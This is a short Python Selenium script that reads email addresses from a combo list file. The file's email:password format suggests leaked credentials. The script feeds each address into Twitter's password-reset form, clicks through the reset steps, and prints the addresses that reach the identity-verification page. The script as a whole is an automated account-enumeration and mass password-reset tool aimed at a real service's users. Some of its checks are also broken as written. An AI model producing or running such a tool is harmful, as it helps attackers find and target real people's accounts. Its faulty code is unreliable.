
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
#fname = input("Enter A File Name :") #comment that if u wanna the script work automatic after that folow  NEXT Line 
ffile = open('combo.txt') #changing ffile = open('YOUR FILE NAME ')
browser  = webdriver.Chrome(ChromeDriverManager().install())
username = 'https://twitter.com/account/verify_user_info'
#Web_Page
browser.get('https://twitter.com/account/begin_password_reset')
while True :
    for line in ffile :
            mail_ = line.split(':')[0]
        #pass_ = line.split(':')[1]
    # Twitter credentials
            tw_email = str(mail_)
    # Fill credentials
            browser.find_element_by_name("account_identifier").send_keys(tw_email)
    # Click.Button Search
            browser.find_element_by_xpath("/html/body/div[2]/div/form/input[3]").click() #Search_button
            browser.find_element_by_xpath('/html/body/div[2]/div/form/input[2]').click() #reset button click
          
            if browser.find_element_by_xpath('/html/body/div[2]/div/form/ul/li[2]/label/input[2]') is True :
                browser.find_element_by_xpath('/html/body/div[2]/div/form/ul/li[2]/label/input[2]').click() 
            
            #Chosing email input radio button
  
            elif browser.find_element('<div class="PageHeader Edge">Verify your personal information</div>') is True :
                print(tw_email)
                continue
            else:
                print("INVALID INPUT -- - - ADD MORE LINES ")
                break #BY hithmast
